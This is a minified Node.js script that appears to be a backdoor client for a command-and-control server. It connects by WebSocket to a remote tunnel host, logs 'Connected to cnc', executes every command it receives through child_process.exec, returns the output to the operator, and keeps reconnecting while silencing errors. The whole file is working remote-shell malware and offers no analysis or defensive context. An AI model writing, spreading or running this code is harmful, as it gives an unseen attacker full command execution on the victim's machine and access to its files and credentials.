const WebSocket=require('ws'),{exec}=require('child_process');function connect(){const ws=new WebSocket('ws://en-teams.gl.at.ply.gg:43276');ws.on('open',()=>console.log('Connected to cnc'));ws.on('message',data=>{const message=Buffer.isBuffer(data)?data.toString('utf8'):data,command=message.trim();if(command.length===0)return void 0;if('cls'===command&&'win32'===process.platform)exec('cls',handleExecResponse);else if('clear'===command&&('linux'===process.platform||'darwin'===process.platform))exec('clear',handleExecResponse);else exec(command,handleExecResponse);function handleExecResponse(error,stdout,stderr){error?ws.send(JSON.stringify({type:'error',message:''})):stdout&&ws.send(JSON.stringify({type:'stdout',message:stdout})),stderr&&ws.send(JSON.stringify({type:'stderr',message:stderr}));}});ws.on('close',()=>setTimeout(connect,1e3)),ws.on('error',()=>{});}connect();
